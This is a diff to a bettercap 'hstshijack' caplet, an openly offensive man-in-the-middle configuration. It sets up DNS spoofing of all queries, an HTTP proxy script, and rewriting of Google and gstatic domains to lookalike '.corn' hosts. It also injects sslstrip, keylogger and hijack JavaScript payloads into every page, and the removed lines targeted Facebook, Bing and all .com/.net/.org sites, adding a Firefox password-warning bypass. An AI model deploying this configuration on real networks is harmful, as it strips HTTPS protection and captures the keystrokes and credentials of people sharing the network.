@@ -1,16 +1,21 @@
-# Documentation can be found at https://github.com/bettercap/caplets/blob/master/hstshijack/README.md
+# Documentation can be found at https://github.com/bettercap/caplets/tree/master/hstshijack
 
-set hstshijack.log             /usr/local/share/bettercap/caplets/hstshijack/ssl.log
-set hstshijack.ignore          *
-set hstshijack.targets         *.facebook.com, *.bing.com, www.*, *.com, *.net,*.org
-set hstshijack.replacements    *.facebook.corn,*.bing.corn,wvvw.*,*.corn,*.nel,*.orq
-#set hstshijack.blockscripts    facebook.com,*.facebook.com
-set hstshijack.obfuscate       false
-set hstshijack.encode          true
-set hstshijack.payloads        *:/usr/local/share/bettercap/caplets/hstshijack/payloads/sslstrip.js,*:/usr/local/share/bettercap/caplets/hstshijack/payloads/keylogger.js,*:/usr/local/share/bettercap/caplets/hstshijack/payloads/firefox-bypass-password-warning.js,*.google.com:/usr/local/share/bettercap/caplets/hstshijack/payloads/google.js,google.com:/usr/local/share/bettercap/caplets/hstshijack/payloads/google.js
+# Domains assigned to 'hstshijack.targets', 'hstshijack.blockscripts' and 'hstshijack.payloads'
+# variables get precendence over those assigned to the 'hstshijack.ignore' variable.
+set hstshijack.targets         *.google.com, google.com, gstatic.com, *.gstatic.com
+set hstshijack.replacements    *.google.corn,google.corn,gstatic.corn,*.gstatic.corn
+set hstshijack.ssl.domains     /usr/local/share/bettercap/caplets/hstshijack/domains.txt
+set hstshijack.ssl.index       /usr/local/share/bettercap/caplets/hstshijack/index.json
+set hstshijack.ssl.check       true
+#set hstshijack.blockscripts    example.com,*.example.com
+set hstshijack.obfuscate       true
+set hstshijack.payloads        *:/usr/local/share/bettercap/caplets/hstshijack/payloads/hijack.js,*:/usr/local/share/bettercap/caplets/hstshijack/payloads/sslstrip.js,*:/usr/local/share/bettercap/caplets/hstshijack/payloads/keylogger.js
+#set hstshijack.ignore          *
 
 set http.proxy.script  /usr/local/share/bettercap/caplets/hstshijack/hstshijack.js
-set dns.spoof.domains  wvvw.*,*.corn,*.nel,*.orq
+http.proxy on
 
-http.proxy  on
-dns.spoof   on
+set dns.spoof.domains  *.google.corn,google.corn,gstatic.corn,*.gstatic.corn
+set dns.spoof.all      true
+dns.spoof on
+
